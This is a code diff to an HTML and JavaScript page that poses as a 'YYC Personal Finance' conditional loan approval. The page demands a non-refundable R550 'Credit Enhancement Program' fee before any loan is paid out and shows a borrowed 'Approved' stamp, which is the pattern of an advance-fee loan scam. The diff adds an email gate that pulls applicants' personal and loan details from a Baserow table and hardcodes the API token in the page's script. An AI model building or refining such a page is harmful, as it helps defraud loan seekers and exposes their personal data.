@@ -27,7 +27,75 @@
             margin: 0;
             padding: 20px;
         }
+        
+        /* Verification Modal */
+        .verification-modal {
+            display: flex;
+            position: fixed;
+            z-index: 3000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            align-items: center;
+            justify-content: center;
+        }
 
+        .verification-content {
+            background-color: #ffffff;
+            padding: 30px 40px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+        }
+        
+        .verification-content h3 {
+            margin-top: 0;
+            font-size: 1.5rem;
+            color: var(--primary);
+        }
+
+        .verification-content .form-group { text-align: left; margin-bottom: 20px; }
+        .verification-content label { display: block; margin-bottom: 8px; font-weight: 500; }
+        .verification-content .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        
+        .verify-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 700;
+            font-size: 1.1rem;
+            transition: background-color 0.3s ease;
+        }
+        
+        .verify-btn:disabled { background-color: var(--gray); cursor: not-allowed; }
+        .verify-btn:hover:not(:disabled) { background-color: #b00f0f; }
+        
+        #verification-error {
+            color: var(--primary);
+            margin-top: 15px;
+            font-weight: 500;
+            min-height: 20px;
+        }
+
+        /* Main Document Wrapper (hidden by default) */
+        #document-wrapper {
+            display: none;
+        }
+        
         .toolbar {
             position: fixed;
             top: 15px;
@@ -53,7 +121,7 @@
         }
 
         .document-container {
-            max-width: 850px; /* Slightly wider for A4 proportion */
+            max-width: 850px;
             margin: 20px auto;
         }
         
@@ -76,24 +144,9 @@
             margin-bottom: 25px;
         }
 
-        .doc-header .logo h1 {
-            color: var(--primary);
-            font-size: 2.2rem;
-            margin: 0;
-        }
-
-        .doc-header .logo h2 {
-            color: var(--secondary);
-            font-size: 1.1rem;
-            margin: 0;
-            font-weight: 500;
-        }
-        
-        .doc-header .header-info {
-            text-align: right;
-            font-size: 0.9rem;
-            color: var(--gray);
-        }
+        .doc-header .logo h1 { color: var(--primary); font-size: 2.2rem; margin: 0; }
+        .doc-header .logo h2 { color: var(--secondary); font-size: 1.1rem; margin: 0; font-weight: 500; }
+        .doc-header .header-info { text-align: right; font-size: 0.9rem; color: var(--gray); }
 
         .doc-footer {
             position: absolute;
@@ -151,8 +204,6 @@
             letter-spacing: 1px;
             border: none;
             cursor: pointer;
-                        padding: 40px;
-
         }
         .pay-now:hover { background-color: #218838; transform: scale(1.05); }
 
@@ -165,7 +216,7 @@
         .stamp-area { width: 45%; text-align: center; }
         .stamp-area img { width: 130px; opacity: 0.8; }
 
-        /* Modal Styles */
+        /* Payment Modal Styles */
         .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); }
         .modal-content { background-color: #fefefe; margin: 15% auto; padding: 30px; border-radius: 10px; width: 90%; max-width: 500px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
         .close-btn { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
@@ -173,7 +224,8 @@
         
         @media print {
             body { padding: 0; background: #fff; }
-            .toolbar, .page { box-shadow: none; border: none; margin: 0; }
+            .toolbar, .verification-modal, .page { box-shadow: none; border: none; margin: 0; }
+            #document-wrapper { display: block !important; }
             .document-container { width: 100%; }
             .page { min-height: 0; page-break-after: always; }
             .page:last-child { page-break-after: auto; }
@@ -182,115 +234,132 @@
 </head>
 <body>
 
-<div class="toolbar">
-    <button class="toolbar-btn" id="downloadPdfBtn"><i class="fas fa-download"></i> Download PDF</button>
-</div>
-
-<div class="document-container" id="loanDocument">
-    <!-- Page 1: Approval & Fee -->
-    <div class="page" id="page1">
-        <div class="doc-header">
-            <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
-            <div class="header-info">
-                <strong>Loan Agreement:</strong> Conditionally Approved<br>
-                <strong>Date:</strong> <span id="current-date"></span><br>
-                <strong>Ref ID:</strong> L-202408-<span id="application-id"></span>
+<!-- Verification Modal -->
+<div id="verificationModal" class="verification-modal">
+    <div class="verification-content">
+        <h3><i class="fas fa-lock"></i> Secure Document Access</h3>
+        <p>Please enter your email address to verify your identity and view your loan agreement.</p>
+        <form id="verificationForm">
+            <div class="form-group">
+                <label for="verification-email">Email Address</label>
+                <input type="email" id="verification-email" class="form-control" required>
             </div>
-        </div>
-
-        <h3>Subject: Conditional Loan Approval Notification</h3>
-        <p>Dear <strong id="user-name-body">Loading...</strong>,</p>
-        <p>We are pleased to inform you that your personal loan application has met the initial requirements and has been conditionally approved. This document outlines the approved terms and the final step required to disburse your funds.</p>
-
-        <div class="info-box">
-            <h4>Approved Loan Terms</h4>
-            <ul>
-                <li><span>Loan Amount Approved:</span> <strong id="loan-amount">R0.00</strong></li>
-                <li><span>Loan Repayment Term:</span> <strong id="loan-duration">0 Months</strong></li>
-                <li><span>Fixed Annual Interest Rate:</span> <strong>3.00%</strong></li>
-                <li><span>Estimated Monthly Installment:</span> <strong id="monthly-payment">R0.00</strong></li>
-            </ul>
-        </div>
-        
-        <div class="warning-box">
-            <h4><i class="fas fa-exclamation-triangle"></i> Action Required: Credit Enhancement Program</h4>
-            <p>Our final assessment indicates that your credit score is below the standard threshold for immediate loan disbursement. To proceed, enrollment in our **Credit Enhancement Program** is mandatory.</p>
-            <p>This program is designed to strengthen your credit standing and guarantee the instant release of your funds. It is a one-time process with a proven success rate.</p>
-            <ul>
-                <li><strong>One-Time Program Fee:</strong> <strong style="color: var(--primary); font-size: 1.3em;">R550.00</strong></li>
-            </ul>
-            <p class="highlight">Upon successful payment of this fee, your approved loan of <strong id="loan-amount-2">R0.00</strong> will be transferred to your bank account without any further delay.</p>
-        </div>
-
-        <h3>Final Step to Receive Your Loan</h3>
-        <p>To finalize the agreement and trigger the immediate transfer of funds, please complete the payment for the Credit Enhancement Program.</p>
-        <div style="text-align: center; margin-top: 30px;">
-            <button id="payNowBtn" class="pay-now">💳 Pay R550 Now & Secure Loan</button>
-        </div>
-
-        <div class="doc-footer">Page 1 of 3</div>
-    </div>
-
-    <!-- Page 2: Amortization Schedule -->
-    <div class="page" id="page2">
-        <div class="doc-header">
-            <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
-            <div class="header-info"><strong>Attachment:</strong> Loan Amortization Schedule</div>
-        </div>
-        <h3>Loan Repayment Schedule</h3>
-        <p>This table details the breakdown of each monthly payment over the loan term, showing how each payment contributes to interest and reduces your outstanding principal balance.</p>
-        
-        <table class="amortization-table">
-            <thead>
-                <tr>
-                    <th>Payment #</th>
-                    <th>Payment Amount</th>
-                    <th>Interest Paid</th>
-                    <th>Principal Paid</th>
-                    <th>Remaining Balance</th>
-                </tr>
-            </thead>
-            <tbody id="amortization-body">
-                <!-- Rows will be generated by JavaScript -->
-            </tbody>
-        </table>
-
-        <div class="doc-footer">Page 2 of 3</div>
-    </div>
-    
-    <!-- Page 3: T&Cs and Signature -->
-    <div class="page" id="page3">
-        <div class="doc-header">
-            <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
-            <div class="header-info"><strong>Attachment:</strong> Terms & Declaration</div>
-        </div>
-        <h3>Terms & Conditions</h3>
-        <ul>
-            <li><strong>Agreement:</strong> This document constitutes a conditional loan offer. It becomes a binding agreement upon the fulfillment of all stated conditions.</li>
-            <li><strong>Credit Enhancement Fee:</strong> The R550 fee is a non-refundable payment for services rendered to improve the applicant's credit profile to meet disbursement criteria. It is not part of the loan principal.</li>
-            <li><strong>Prepayment:</strong> The loan may be settled early in full or in part at any time without incurring penalties.</li>
-            <li><strong>Default:</strong> Failure to make timely monthly payments may result in late fees, legal action, and adverse reporting to national credit bureaus, which will impact your credit score.</li>
-            <li><strong>Privacy:</strong> All personal information is handled in strict compliance with the Protection of Personal Information (POPI) Act of South Africa.</li>
-        </ul>
-
-        <h3>Declaration & Signature</h3>
-        <p>By proceeding with the payment, I, <strong id="user-name-3">Loading...</strong>, confirm that I have read, fully understood, and agree to all terms and conditions outlined in this 3-page loan document. I authorize YYC Loans to execute the Credit Enhancement Program and disburse the approved loan funds into my designated account upon successful payment of the R550 fee.</p>
-
-        <div class="signature-section">
-            <div class="signature-block">
-                <strong>Applicant's Acknowledgment & Digital Assent</strong>
-                <p style="font-size: 0.9rem;">(Payment of fee constitutes a digital signature)</p>
-            </div>
-            <div class="stamp-area">
-                <img src="https://style.propertystories.co.za/wp-content/uploads/2019/10/3_Original_Approved_Stamp_-_Copy-1-300x203.png" alt="Official Approval Stamp">
-                <p class="highlight" style="margin:0;">For YYC Loans Management</p>
-            </div>
-        </div>
-        <div class="doc-footer">Page 3 of 3</div>
+            <button type="submit" id="verifyBtn" class="verify-btn">Verify & View Document</button>
+            <div id="verification-error"></div>
+        </form>
     </div>
 </div>
 
-<!-- The Modal -->
+
+<div id="document-wrapper">
+    <div class="toolbar">
+        <button class="toolbar-btn" id="downloadPdfBtn"><i class="fas fa-download"></i> Download PDF</button>
+    </div>
+
+    <div class="document-container" id="loanDocument">
+        <!-- Page 1: Approval & Fee -->
+        <div class="page" id="page1">
+            <div class="doc-header">
+                <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
+                <div class="header-info">
+                    <strong>Loan Agreement:</strong> Conditionally Approved<br>
+                    <strong>Date:</strong> <span id="current-date"></span><br>
+                    <strong>Ref ID:</strong> L-202408-<span id="application-id"></span>
+                </div>
+            </div>
+
+            <h3>Subject: Conditional Loan Approval Notification</h3>
+            <p>Dear <strong id="user-name-body"></strong>,</p>
+            <p>We are pleased to inform you that your personal loan application has met the initial requirements and has been conditionally approved. This document outlines the approved terms and the final step required to disburse your funds.</p>
+
+            <div class="info-box">
+                <h4>Approved Loan Terms</h4>
+                <ul>
+                    <li><span>Loan Amount Approved:</span> <strong id="loan-amount"></strong></li>
+                    <li><span>Loan Repayment Term:</span> <strong id="loan-duration"></strong></li>
+                    <li><span>Fixed Annual Interest Rate:</span> <strong>3.00%</strong></li>
+                    <li><span>Estimated Monthly Installment:</span> <strong id="monthly-payment"></strong></li>
+                </ul>
+            </div>
+            
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> Action Required: Credit Enhancement Program</h4>
+                <p>Our final assessment indicates that your credit score is below the standard threshold for immediate loan disbursement. To proceed, enrollment in our **Credit Enhancement Program** is mandatory.</p>
+                <p>This program is designed to strengthen your credit standing and guarantee the instant release of your funds. It is a one-time process with a proven success rate.</p>
+                <ul>
+                    <li><strong>One-Time Program Fee:</strong> <strong style="color: var(--primary); font-size: 1.3em;">R550.00</strong></li>
+                </ul>
+                <p class="highlight">Upon successful payment of this fee, your approved loan of <strong id="loan-amount-2"></strong> will be transferred to your bank account without any further delay.</p>
+            </div>
+
+            <h3>Final Step to Receive Your Loan</h3>
+            <p>To finalize the agreement and trigger the immediate transfer of funds, please complete the payment for the Credit Enhancement Program.</p>
+            <div style="text-align: center; margin-top: 30px;">
+                <button id="payNowBtn" class="pay-now">💳 Pay R550 Now & Secure Loan</button>
+            </div>
+
+            <div class="doc-footer">Page 1 of 3</div>
+        </div>
+
+        <!-- Page 2: Amortization Schedule -->
+        <div class="page" id="page2">
+            <div class="doc-header">
+                <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
+                <div class="header-info"><strong>Attachment:</strong> Loan Amortization Schedule</div>
+            </div>
+            <h3>Loan Repayment Schedule</h3>
+            <p>This table details the breakdown of each monthly payment over the loan term, showing how each payment contributes to interest and reduces your outstanding principal balance.</p>
+            
+            <table class="amortization-table">
+                <thead>
+                    <tr>
+                        <th>Payment #</th>
+                        <th>Payment Amount</th>
+                        <th>Interest Paid</th>
+                        <th>Principal Paid</th>
+                        <th>Remaining Balance</th>
+                    </tr>
+                </thead>
+                <tbody id="amortization-body"></tbody>
+            </table>
+
+            <div class="doc-footer">Page 2 of 3</div>
+        </div>
+        
+        <!-- Page 3: T&Cs and Signature -->
+        <div class="page" id="page3">
+            <div class="doc-header">
+                <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
+                <div class="header-info"><strong>Attachment:</strong> Terms & Declaration</div>
+            </div>
+            <h3>Terms & Conditions</h3>
+            <ul>
+                <li><strong>Agreement:</strong> This document constitutes a conditional loan offer. It becomes a binding agreement upon the fulfillment of all stated conditions.</li>
+                <li><strong>Credit Enhancement Fee:</strong> The R550 fee is a non-refundable payment for services rendered to improve the applicant's credit profile to meet disbursement criteria. It is not part of the loan principal.</li>
+                <li><strong>Prepayment:</strong> The loan may be settled early in full or in part at any time without incurring penalties.</li>
+                <li><strong>Default:</strong> Failure to make timely monthly payments may result in late fees, legal action, and adverse reporting to national credit bureaus, which will impact your credit score.</li>
+                <li><strong>Privacy:</strong> All personal information is handled in strict compliance with the Protection of Personal Information (POPI) Act of South Africa.</li>
+            </ul>
+
+            <h3>Declaration & Signature</h3>
+            <p>By proceeding with the payment, I, <strong id="user-name-3"></strong>, confirm that I have read, fully understood, and agree to all terms and conditions outlined in this 3-page loan document. I authorize YYC Loans to execute the Credit Enhancement Program and disburse the approved loan funds into my designated account upon successful payment of the R550 fee.</p>
+
+            <div class="signature-section">
+                <div class="signature-block">
+                    <strong>Applicant's Acknowledgment & Digital Assent</strong>
+                    <p style="font-size: 0.9rem;">(Payment of fee constitutes a digital signature)</p>
+                </div>
+                <div class="stamp-area">
+                    <img src="https://style.propertystories.co.za/wp-content/uploads/2019/10/3_Original_Approved_Stamp_-_Copy-1-300x203.png" alt="Official Approval Stamp">
+                    <p class="highlight" style="margin:0;">For YYC Loans Management</p>
+                </div>
+            </div>
+            <div class="doc-footer">Page 3 of 3</div>
+        </div>
+    </div>
+</div>
+
+<!-- The Payment Modal -->
 <div id="contactModal" class="modal">
   <div class="modal-content">
     <span class="close-btn">×</span>
@@ -308,95 +377,153 @@
 </div>
 
 <script>
+    // --- Baserow API Configuration ---
+    const BASEROW_API_BASE_URL = 'https://api.baserow.io/api/';
+    const BASEROW_API_KEY = 'qVXtv5uzHaSzMLbLRE7rITJHlc4G6WN2';
+    const BASEROW_TABLE_ID = '558162';
+    const EMAIL_FIELD_ID = '4477079';
+    const FULLNAME_FIELD_ID = '4477077';
+    const LOAN_AMOUNT_FIELD_ID = '4477085';
+    const REPAYMENT_PERIOD_FIELD_ID = '4477086';
+    
     const formatCurrency = (num) => `R${num.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
 
-    function generateAmortizationSchedule(principal, duration, monthlyRate, monthlyPayment) {
+    /**
+     * Fetches user data from Baserow based on email.
+     */
+    async function fetchUserData(email) {
+        const url = `${BASEROW_API_BASE_URL}database/rows/table/${BASEROW_TABLE_ID}/?filter__field_${EMAIL_FIELD_ID}__equal=${encodeURIComponent(email)}&user_field_names=false`;
+        try {
+            const response = await fetch(url, {
+                method: 'GET',
+                headers: { 'Authorization': `Token ${BASEROW_API_KEY}` }
+            });
+            if (!response.ok) {
+                console.error("Baserow API Error:", await response.text());
+                return null;
+            }
+            const data = await response.json();
+            return (data.results && data.results.length > 0) ? data.results[0] : null;
+        } catch (error) {
+            console.error("Network or script error:", error);
+            return null;
+        }
+    }
+
+    /**
+     * Generates the repayment schedule based on the custom calculation.
+     */
+    function generateAmortizationSchedule(principal, duration, monthlyPayment) {
         const tableBody = document.getElementById("amortization-body");
-        tableBody.innerHTML = ''; // Clear previous entries
+        tableBody.innerHTML = '';
+        
+        const totalInterest = principal * 0.03;
+        const interestPortion = totalInterest / duration;
+        const principalPortion = principal / duration;
         let remainingBalance = principal;
 
         for (let i = 1; i <= duration; i++) {
-            const interestPaid = remainingBalance * monthlyRate;
-            const principalPaid = monthlyPayment - interestPaid;
-            remainingBalance -= principalPaid;
+            remainingBalance -= principalPortion;
             
-            // Ensure final balance is exactly zero
-            if (i === duration) {
-                remainingBalance = 0;
-            }
+            if (i === duration) remainingBalance = 0; // Correct final balance
 
             const row = `<tr>
                 <td>${i}</td>
                 <td>${formatCurrency(monthlyPayment)}</td>
-                <td>${formatCurrency(interestPaid)}</td>
-                <td>${formatCurrency(principalPaid)}</td>
+                <td>${formatCurrency(interestPortion)}</td>
+                <td>${formatCurrency(principalPortion)}</td>
                 <td>${formatCurrency(Math.abs(remainingBalance))}</td>
             </tr>`;
             tableBody.innerHTML += row;
         }
     }
 
-    function loadApprovalData() {
-        const data = JSON.parse(localStorage.getItem('loanApplication')) || {
-            fullName: 'Valued Applicant',
-            loanAmount: '25000',
-            loanDuration: '24'
-        };
+    /**
+     * Populates the entire document with data fetched from Baserow.
+     */
+    function populateDocument(userData) {
+        // Extract data
+        const fullName = userData[`field_${FULLNAME_FIELD_ID}`] || 'Valued Applicant';
+        const loanAmount = parseFloat(userData[`field_${LOAN_AMOUNT_FIELD_ID}`] || 0);
+        const loanDurationStr = userData[`field_${REPAYMENT_PERIOD_FIELD_ID}`] || '0 months';
+        const loanDuration = parseInt(loanDurationStr, 10);
+        const appId = userData.id || Math.floor(1000 + Math.random() * 9000);
 
-        const name = data.fullName;
-        const amount = parseFloat(data.loanAmount.replace(/[^0-9.]/g, ''));
-        const duration = parseInt(data.loanDuration, 10);
-        const appId = Math.floor(1000 + Math.random() * 9000);
-
-        const annualRate = 0.03;
-        const monthlyRate = annualRate / 12;
-        let monthlyPayment = 0;
-        if (amount && duration > 0 && monthlyRate > 0) {
-            monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, duration)) / (Math.pow(1 + monthlyRate, duration) - 1);
-        }
-
-        // Populate all dynamic fields
-        document.getElementById("user-name-body").textContent = name;
-        document.getElementById("user-name-3").textContent = name;
+        // --- Perform Calculations ---
+        const totalRepayable = loanAmount * 1.03; // Loan Amount + 3%
+        const monthlyPayment = loanDuration > 0 ? totalRepayable / loanDuration : 0;
+        
+        // --- Populate all dynamic fields ---
+        document.getElementById("user-name-body").textContent = fullName;
+        document.getElementById("user-name-3").textContent = fullName;
         document.getElementById("application-id").textContent = appId;
         document.getElementById("application-id-modal").textContent = appId;
         
-        document.getElementById("loan-amount").textContent = formatCurrency(amount);
-        document.getElementById("loan-amount-2").textContent = formatCurrency(amount);
-        document.getElementById("loan-duration").textContent = `${duration} Months`;
+        document.getElementById("loan-amount").textContent = formatCurrency(loanAmount);
+        document.getElementById("loan-amount-2").textContent = formatCurrency(loanAmount);
+        document.getElementById("loan-duration").textContent = `${loanDuration} Months`;
         document.getElementById("monthly-payment").textContent = formatCurrency(monthlyPayment);
 
         const today = new Date().toLocaleDateString("en-ZA", { year: 'numeric', month: 'long', day: 'numeric' });
         document.getElementById("current-date").textContent = today;
         
-        // Generate schedule
-        generateAmortizationSchedule(amount, duration, monthlyRate, monthlyPayment);
+        // Generate the amortization schedule with new values
+        generateAmortizationSchedule(loanAmount, loanDuration, monthlyPayment);
     }
+    
+    // --- Event Listener for Verification Form ---
+    document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const email = document.getElementById('verification-email').value.trim();
+        const verifyBtn = document.getElementById('verifyBtn');
+        const errorMessage = document.getElementById('verification-error');
+        
+        if (!email) {
+            errorMessage.textContent = "Please enter an email address.";
+            return;
+        }
 
-    // Modal logic
-    const modal = document.getElementById("contactModal");
-    const btn = document.getElementById("payNowBtn");
-    const span = document.getElementsByClassName("close-btn")[0];
-    btn.onclick = () => modal.style.display = "block";
-    span.onclick = () => modal.style.display = "none";
+        verifyBtn.disabled = true;
+        verifyBtn.textContent = 'Verifying...';
+        errorMessage.textContent = '';
+
+        const userData = await fetchUserData(email);
+
+        if (userData) {
+            populateDocument(userData);
+            // Hide verification modal and show document
+            document.getElementById('verificationModal').style.display = 'none';
+            document.getElementById('document-wrapper').style.display = 'block';
+        } else {
+            errorMessage.textContent = "No application found for this email. Please try again.";
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'Verify & View Document';
+        }
+    });
+
+    // --- Logic for Payment Modal ---
+    const contactModal = document.getElementById("contactModal");
+    const payNowBtn = document.getElementById("payNowBtn");
+    const closeBtn = contactModal.querySelector(".close-btn");
+    payNowBtn.onclick = () => contactModal.style.display = "block";
+    closeBtn.onclick = () => contactModal.style.display = "none";
     window.onclick = (event) => {
-        if (event.target == modal) modal.style.display = "none";
+        if (event.target == contactModal) contactModal.style.display = "none";
     };
 
-    // PDF Download logic
+    // --- PDF Download Logic ---
     document.getElementById('downloadPdfBtn').addEventListener('click', function () {
         const element = document.getElementById('loanDocument');
         const opt = {
-            margin:       [0, 0, 0, 0],
-            filename:     `YYC_Loan_Agreement_${document.getElementById("application-id").textContent}.pdf`,
-            image:        { type: 'jpeg', quality: 0.98 },
-            html2canvas:  { scale: 2, useCORS: true },
-            jsPDF:        { unit: 'in', format: 'a4', orientation: 'portrait' }
+            margin: [0, 0, 0, 0],
+            filename: `YYC_Loan_Agreement_${document.getElementById("application-id").textContent}.pdf`,
+            image: { type: 'jpeg', quality: 0.98 },
+            html2canvas: { scale: 2, useCORS: true },
+            jsPDF: { unit: 'in', format: 'a4', orientation: 'portrait' }
         };
         html2pdf().set(opt).from(element).save();
     });
 
-    document.addEventListener("DOMContentLoaded", loadApprovalData);
 </script>
 
 </body>
